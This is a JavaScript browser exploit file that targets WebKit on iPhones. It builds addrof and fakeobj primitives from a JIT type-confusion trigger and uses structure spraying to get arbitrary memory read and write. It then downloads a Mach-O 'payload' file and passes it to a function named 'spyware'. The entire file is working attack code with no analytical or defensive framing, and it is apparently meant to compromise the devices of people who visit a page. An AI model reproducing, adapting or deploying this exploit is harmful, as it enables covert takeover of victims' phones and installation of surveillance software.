ITERS = 1E4;
ALLOCS = 1E3;
var conversion_buffer = new ArrayBuffer(8);
var f64 = new Float64Array(conversion_buffer);
var i32 = new Uint32Array(conversion_buffer);
var BASE32 = 4294967296;

function f2i(f)
{
	f64[0] = f;
	return i32[0] + BASE32 * i32[1]
}

function i2f(i)
{
	i32[0] = i % BASE32

	i32[1] = i / BASE32

	return f64[0]
}

function hexit(x)
{
	if (x < 0) return "-" + hex(-x);
	return "0x" + x.toString(16)
}

function xor(a, b)
{
	var res = 0,
		base = 1;
	for (var i = 0; i < 64; ++i)
	{
		res += base * (a & 1 ^ b & 1);
		a = (a - (a & 1)) / 2;
		b = (b - (b & 1)) / 2;
		base *= 2
	}
	return res
}

counter = 0;

function trigger(constr, modify, res, val)
{
	return eval("\n    var o = [13.37]\n    var Constructor" + counter + " = function(o) { " + constr + " }\n\n    var hack = false\n\n    var Wrapper = new Proxy(Constructor" + counter + ", {\n        get: function() {\n            if (hack) {\n                " + modify + "\n            }\n        }\n    })\n\n    for (var i = 0; i < ITERS; ++i)\n        new Wrapper(o)\n\n    hack = true\n    var bar = new Wrapper(o)\n    " + res + "\n    ")
}

function pwn() // my4
{
	var stage1 =
	{
		addrof: function(victim)
		{
			return f2i(trigger("this.result = o[0]", "o[0] = val", "bar.result", victim))
		},

		fakeobj: function(addr)
		{
			return trigger("o[0] = val", "o[0] = {}", "o[0]", i2f(addr))
		},

		test: function()
		{
			var addr = this.addrof(
			{
				a: 4919
			});

			var x = this.fakeobj(addr);

			if (x.a != 4919)
			{
				//prompt(undefined, "Webkit Exploit Failed: Please reload the page or restart the app and wait a few seconds before retrying")

				pwn.Failed = true
			}
		}
	}

	stage1.test()

	if (arguments.callee.Failed)
	{
		//prompt(undefined, "FAILED")

		setTimeout.call(self, function()
		{
			location.replace(location.protocol + "//" + location.hostname + location.pathname)

		}, 4000)

		return
	}

	var memory = get_mem_old(stage1)

	var addrfake;

	if (memory.hasOwnProperty("fakeobj") && memory.hasOwnProperty("addrof"))
	{
		addrfake = memory

		//prompt(undefined, "1: " + addrfake)
	}
	else // here
	{
		addrfake = stage1

		//prompt(undefined, "2: " + addrfake)
	}

	spyware(addrfake, memory, arguments[0])
}

function get_mem_old(stage1)
{
	var structs = [];

	function sprayStructures()
	{
		function randomString()
		{
			return Math.random().toString(36).replace(/[^a-z]+/g, "").substr(0, 5)
		}

		for (var i = 0; i < 4096; i++)
		{
			var a = new Float64Array(1);

			a[randomString()] = 1337;

			structs.push(a)
		}
	}

	sprayStructures()

	var hax = new Uint8Array(4096);

	var jsCellHeader = new Int64([0, 16, 0, 0, 0, 39, 24, 1]);

	var container =
	{
		jsCellHeader: jsCellHeader.asJSValue(),
		butterfly: false,
		vector: hax,
		lengthAndFlags: (new Int64("0x0001000000000010")).asJSValue()
	};

	var address = Add(stage1.addrof(container), 16)

	var fakearray = stage1.fakeobj(address);

	while (!(fakearray instanceof Float64Array))
	{
		jsCellHeader.assignAdd(jsCellHeader, Int64.One);

		container.jsCellHeader = jsCellHeader.asJSValue()
	}

	memory =
	{
		read: function(addr, length)
		{
			fakearray[2] = i2f(addr);

			var a = new Array(length);

			for (var i = 0; i < length; i++)
			{
				a[i] = hax[i];
			}

			return a
		},

		readInt64: function(addr)
		{
			return new Int64(this.read(addr, 8))
		},

		write: function(addr, data)
		{
			fakearray[2] = i2f(addr);
			for (var i = 0; i < data.length; i++) hax[i] = data[i]
		},

		writeInt64: function(addr, val)
		{
			return this.write(addr, val.bytes())
		}
	};

	var empty = {};

	var header = memory.read(stage1.addrof(empty), 8)

	//prompt(undefined, header)

	memory.write(stage1.addrof(container), header);

	var f64array = new Float64Array(8);

	header = memory.read(stage1.addrof(f64array), 16);

	memory.write(stage1.addrof(fakearray), header);

	memory.write(Add(stage1.addrof(fakearray), 24), [16, 0, 0, 0, 1, 0, 0, 0]);

	fakearray.container = container;

	return memory
}

function get_mem_new(stage1)
{
	var FPO = typeof SharedArrayBuffer === "undefined" ? 24 : 16;
	var structure_spray = [];
	for (var i = 0; i < 1E3; ++i)
	{
		var ary = {
			a: 1,
			b: 2,
			c: 3,
			d: 4,
			e: 5,
			f: 6,
			g: 268435455
		};
		ary["prop" + i] = 1;
		structure_spray.push(ary)
	}
	var manager = structure_spray[500];
	var leak_addr = stage1.addrof(manager);

	function alloc_above_manager(expr)
	{
		var res;
		do {
			for (var i = 0; i < ALLOCS; ++i) structure_spray.push(eval(expr));
			res = eval(expr)
		} while (stage1.addrof(res) < leak_addr);
		return res
	}
	var unboxed_size = 100;
	var unboxed = alloc_above_manager("[" + "13.37,".repeat(unboxed_size) + "]");
	var boxed = alloc_above_manager("[{}]");
	var victim = alloc_above_manager("[]");
	victim.p0 = 4919;

	function victim_write(val)
	{
		victim.p0 = val
	}

	function victim_read()
	{
		return victim.p0
	}
	i32[0] = 512;
	i32[1] = 17309703 - 65536;

	var outer =
	{
		p0: 0,
		p1: f64[0],
		p2: manager,
		p3: 268435455
	};

	var fake_addr = stage1.addrof(outer) + FPO + 8;

	var unboxed_addr = stage1.addrof(unboxed);

	var boxed_addr = stage1.addrof(boxed);

	var victim_addr = stage1.addrof(victim);

	var holder =
	{
		fake: {}
	};

	holder.fake = stage1.fakeobj(fake_addr);

	var shared_butterfly = f2i(holder.fake[(unboxed_addr + 8 - leak_addr) / 8]);

	var boxed_butterfly = holder.fake[(boxed_addr + 8 - leak_addr) / 8];

	holder.fake[(boxed_addr + 8 - leak_addr) / 8] = i2f(shared_butterfly);

	var victim_butterfly = holder.fake[(victim_addr + 8 - leak_addr) / 8];

	function set_victim_addr(where)
	{
		holder.fake[(victim_addr + 8 - leak_addr) / 8] = i2f(where + 16)
	}

	function reset_victim_addr()
	{
		holder.fake[(victim_addr + 8 - leak_addr) / 8] = victim_butterfly
	}

	var stage2 =
	{
		addrof: function(victim)
		{
			boxed[0] = victim;

			return f2i(unboxed[0])
		},
		fakeobj: function(addr)
		{
			unboxed[0] = (new Int64(addr)).asDouble();
			return boxed[0]
		},
		write64: function(where, what)
		{
			set_victim_addr(where);
			victim_write(this.fakeobj(what));
			reset_victim_addr()
		},
		read64: function(where)
		{
			set_victim_addr(where);
			var res = this.addrof(victim_read());
			reset_victim_addr();
			return res
		},
		writeInt64: function(where, what)
		{
			set_victim_addr(where);
			victim_write(this.fakeobj(f2i(what.asDouble())));
			reset_victim_addr()
		},
		readInt64: function(where)
		{
			set_victim_addr(where);
			var res = this.addrof(victim_read());
			reset_victim_addr();
			return new Int64(res)
		},
		read: function(addr, length)
		{
			var a = new Array(length);
			var i;
			for (i = 0; i + 8 < length; i += 8)
			{
				v = this.readInt64(addr + i).bytes();
				for (var j = 0; j < 8; j++) a[i + j] = v[j]
			}
			v = this.readInt64(addr + i).bytes();
			for (var j = i; j < length; j++) a[j] = v[j - i];
			return a
		},
		write: function(addr, data)
		{
			throw "maybe later";
		}
	};
	return stage2
}

function go() // my2
//!function()
{
	if (String.prototype.indexOf.call(navigator.userAgent, "iPhone") == -1)
	{
		//prompt(undefined, "nope")

		return
	}

	try
	{
		var req = new XMLHttpRequest;

		req.open("get", "payload");

		req.responseType = "arraybuffer";

		req.addEventListener("load", function()
		{
			try
			{
				if (req.responseType != "arraybuffer")
				{
					throw "Not a blob!";
				}

				var arrayBuf = new Uint8Array(req.response);

				var header = self.b2u32(arrayBuf.slice(0, 4))

				if (header != 4277009103)
				{
					prompt(undefined, "header is invalid: " + hexit(header) + ", should be 0xfeedfacf\nwtf is your payload??")

					return
				}

				pwn(arrayBuf) // my3
			}
			catch (e)
			{
				//prompt(undefined, "Error: " + e + (e != null ? "\n" + e.stack : ""))
			}
		});
		req.addEventListener("error", function(ev)
		{
			prompt(undefined, ev)
		});

		req.send()
	}
	catch (e)
	{
		prompt(undefined, "Error: " + e + (e != null ? "\n" + e.stack : ""))
	}
}

//prompt(undefined, "ok_2")